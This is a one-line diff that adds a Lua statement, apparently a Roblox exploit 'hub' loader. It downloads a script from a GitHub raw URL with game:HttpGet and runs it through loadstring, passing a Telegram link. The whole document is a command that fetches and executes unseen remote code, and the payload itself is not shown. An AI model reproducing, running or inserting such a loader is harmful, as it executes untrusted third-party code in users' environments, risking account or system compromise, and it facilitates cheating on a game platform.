@@ -1,0 +1,1 @@
+loadstring(game:HttpGet'https://raw.githubusercontent.com/anowerrrr333-star/scripts/refs/heads/main/nameless_hub.lua')("https://t.me/PersianPwn")
